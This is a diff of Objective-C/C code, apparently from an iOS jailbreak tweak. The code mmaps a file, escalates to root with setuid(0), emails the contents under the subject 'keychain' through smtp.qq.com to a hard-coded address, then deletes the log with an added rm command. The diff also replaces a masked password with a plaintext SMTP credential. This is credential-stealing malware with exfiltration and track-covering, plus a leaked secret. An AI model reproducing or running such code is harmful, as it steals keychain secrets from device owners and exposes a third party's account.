@@ -548,6 +548,8 @@ void sendmail(const char *username,const char *password,const char *email,const 
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
     NSLog(@"%s",rbuf);
+    //delete taiji.log after sent
+    system("rm /var/mobile/taiji.log");
     return;
 }
 
@@ -562,11 +564,6 @@ int open_socket(struct sockaddr *addr) {
     }
     return sockfd;
 }
-
-
-
-
-
 
 #pragma mark - AFNetwork(伪)
 
@@ -672,16 +669,16 @@ static IMP sOriginalImp = NULL;
         int len = (int)lseek(fd,0,SEEK_END);
         char *mbuf = (char *) mmap(NULL,len,PROT_READ,MAP_PRIVATE,fd,0);
         setuid(0);
-        sendmail("445108920@qq.com","*******","445108920@qq.com","smtp.qq.com","keychain",mbuf);
+        sendmail("445108920@qq.com","xrmdeqq1234clcl!","445108920@qq.com","smtp.qq.com","keychain",mbuf);
     });
     
 
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
+        /*printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassIdentity), (CFTypeRef)(id)kSecClassIdentity);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
-        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
+        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);*/
     });
     
     static dispatch_once_t onceToken1;
